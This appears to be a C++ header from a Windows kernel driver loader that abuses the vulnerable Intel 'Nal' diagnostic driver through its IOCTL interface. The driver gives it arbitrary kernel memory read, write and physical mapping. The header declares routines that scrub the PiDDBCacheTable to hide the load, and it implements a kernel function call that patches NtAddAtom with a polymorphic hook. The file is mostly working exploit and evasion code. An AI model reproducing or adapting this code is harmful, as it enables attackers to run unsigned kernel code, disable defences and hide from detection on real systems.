	#pragma once

	#include "Common.hpp"
	#include "Helper.hpp"
	#include "PEUtils.hpp"
	#include "X64Assembler.hpp"
	#include "Win.hpp"
    #include "StealthLog.hpp"
	#include <ntstatus.h>
    #include <winternl.h>  




	// Intel driver
	constexpr auto DEVICE_NAME = L"\\\\.\\Nal";


	// Unique IOCTL code needed for the exploit, dispatch is handled by the Intel driver via case_number field. 
	constexpr ULONG32 ioctl1 = 0x80862007;


	// Correspondig case numbers to pass to deviceIoControl.
	enum IOCTL_CASE_NUMBER
	{
		COPY_MEMORY_BUFF_INFO = 0x33,
		FILL_MEMORY_BUFF_INFO = 0x30,
		GET_PHYS_ADDRESS_BUFF_INFO = 0x25,
		MAP_IO_SPACE_BUFF_INFO = 0x19,
		UNMAP_IO_SPACE_BUFF_INFO = 0x1A
	};


	// IOCTL Commands Structs
	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;

	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;




	class IntelLoader
	{
	private:
		HANDLE hIntelDriver;
		UINT64 ntoskrnlBaseAddress = 0;
		KernelOffsets m_offsets;
	



	public:
		IntelLoader();
		~IntelLoader();

		/* Intel driver management */
		std::wstring GetDriverPath();
		std::wstring GetDriverName();
		BOOL LoadVulnDriver();
		BOOL UnloadVulnDriver();
		BOOL OpenDevice();

	



		/* Memory & resources management */
		BOOL MemoryCopy(uint64_t destination, uint64_t source, uint64_t size) const;
		BOOL SetMemory(uint64_t address, uint32_t value, uint64_t size) const;
		BOOL GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) const;
		UINT64 MapIoSpace(uint64_t physical_address, uint32_t size) const;
		BOOL UnmapIoSpace(uint64_t address, uint32_t size) const;
		BOOL ReadMemory(uint64_t address, void* buffer, uint64_t size) const;
		BOOL WriteMemory(uint64_t address, void* buffer, uint64_t size) const;
		BOOL WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) const;
		BOOL ExFreePool(uint64_t address);
		UINT64 MmAllocateIndependentPagesEx(uint32_t size);
		BOOLEAN MmFreeIndependentPages(uint64_t address, uint32_t size);
		BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG newProtection);
		BOOL ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait);
		BOOL ExReleaseResourceLite(PVOID resource);

	



		/* PiDDBCacheTable cleaning function */
		PVOID GetPiDDBLock() const;
		PRTL_AVL_TABLE GetPiDDBCacheTable() const;

		BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
		PVOID RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID Buffer);
		PiDDBCacheEntry* LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
		PVOID RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Table, PVOID* RestartKey);


		/* Helpers */
		VOID SetKernelBaseAddress();
		UINT64 GetNtoskrnlBaseAddress() const noexcept;
		VOID SetOffsets(const KernelOffsets& off) noexcept { m_offsets = off; }
		[[nodiscard]] const KernelOffsets& GetOffsets() const noexcept { return m_offsets; }
		
		
		
		UINT64 GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
		PVOID ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize) const;

		BOOL IsValid() const noexcept { return hIntelDriver != INVALID_HANDLE_VALUE && ntoskrnlBaseAddress != 0; }
		BOOL IsCanonicalAddress(uint64_t address) const { uint64_t high = address >> 48;  return high == 0 || high == 0xFFFF; }
		HANDLE GetHandle() const { return hIntelDriver; }




			template <typename T, typename... A>
			bool CallKernelFunction(uint64_t KernelBase, T* out_result, uint64_t kernel_function_address, A... arguments)
			{
				constexpr bool is_void = std::is_same_v<T, void>;
				static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments supported");

				JumpLine();
				LOG_INFO("***Calling kernel function***");
				JumpLine();

				if constexpr (!is_void)
				{
					if (!out_result)
					{
						std::wcout << L"out_result is null\n";
						return false;
					}
				}

				if (!kernel_function_address)
				{
					std::wcout << L"kernel_function_address is null\n";
					return false;
				}

				HMODULE ntdll = GetModuleHandleA("ntdll.dll");
				if (!ntdll)
				{
					std::wcout << L"GetModuleHandleA(ntdll) failed\n";
					return false;
				}

				const auto NtAddAtomUser = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
				if (!NtAddAtomUser)
				{
					std::wcout << L"GetProcAddress(NtAddAtom) failed\n";
					return false;
				}

				uint64_t kernel_NtAddAtom = GetKernelModuleExport(KernelBase, "NtAddAtom");
				if (!kernel_NtAddAtom)
				{
					std::wcout << L"GetKernelModuleExport(ntoskrnl.NtAddAtom) failed\n";
					return false;
				}

				uint8_t oriNtAddAtomBytes[12] = { 0 };

				LOG_INFO("Saving NtAddAtom original prologue...");
				if (!ReadMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12))
				{
					LOG_ERROR("Failed to save NtAddAtom prologue.");
					return false;
				}

				std::wstringstream hexBytes;
				hexBytes << "Original bytes: ";
				for (int i = 0; i < 12; i++)
				{
					hexBytes << std::hex << std::setw(2) << std::setfill(L'0')
						<< static_cast<int>(oriNtAddAtomBytes[i]) << L" ";
				}

				LOG_INFO(hexBytes.str());


				LOG_SUCCESS("Original bytes saved successfully.");

				auto hook_vec = X64Assembler::PolymorphicHook(kernel_function_address, 12);

				if (!WriteToReadOnlyMemory(kernel_NtAddAtom, (void*)hook_vec.data(), 12))
				{
					LOG_ERROR("Failed to write hook to kernel function.");
					return false;
				} 

				LOG_SUCCESS("Hook written successfully.");

				// Make the call
				using FunctionFn = T(__stdcall*)(A...);
				const auto fn = reinterpret_cast<FunctionFn>(NtAddAtomUser);

				if constexpr (is_void)
				{
					fn(arguments...);
					LOG_WARNING("VOID call completed.");
				}
				else
				{
					*out_result = fn(arguments...);
					LOG_SUCCESS("Function returned : " << *out_result);
				}

				LOG_INFO("Restoring original bytes...");

				// And finally restore the original bytes.
				const bool restored = WriteToReadOnlyMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12);
				if (!restored)
				{
					LOG_ERROR("Failed to restore original bytes.");
					// Not returning false here, the call may have succeded despite the fact
					// that we cannot unhook the function for whatever reason.
				}
				


				LOG_SUCCESS("Function call completed successfully.");
				JumpLine();
				return restored;
			}
	};
